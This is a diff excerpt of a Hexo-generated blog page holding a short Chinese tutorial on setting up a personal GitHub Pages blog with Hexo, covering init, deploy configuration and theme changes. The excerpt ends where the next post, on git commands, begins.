+    <article id="post-hexo-搭建个人博客" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class=" article-header">
+  
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/01/07/hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/">hexo 搭建个人博客</a>
+    </h1>
+  
+
+  
+  <a href="/2020/01/07/hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" class="archive-article-date">
+  	<time datetime="2020-01-07T03:50:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-07</time>
+</a>
+  
+
+
+  
+  </header>
+
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>##其实非常简单<br>环境要求：git,node,hexo<br>先npm下载再说其他免谈<br>##<br>在这之前，在github上建立好自己的博客仓库<br>博客仓库名要求为：wangzhiming1999.github.io<br>1.初始化创建博客仓库：hexo init<br>2.hexo s 运行博客<br>3.打开_config.yml 找到deploy<br>添加 (注意引号和配置要有空格)<br>type: git<br> repo: <a href="https://github.com/wangzhiming1999/wangzhiming1999.github.io.git" target="_blank" rel="noopener">https://github.com/wangzhiming1999/wangzhiming1999.github.io.git</a><br>branch: master<br>配置好后<br>hexo clean 清除下<br>hexo  s  运行<br>hexo d 推送git<br>修改我们可以 hexo n  “文章名字”<br>之后我们就可以通过wangzhiming1999.github.io.git访问了<br>其中我们可以更换主题修改_config.yml文件的<br>theme: yilia 后面为自己克隆下来的主题<br>界面的事情就交给你们自己去完成了，反正我觉得挺好看的</p>
+
+    
+
+    
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2020/01/07/hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-git命令大全" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
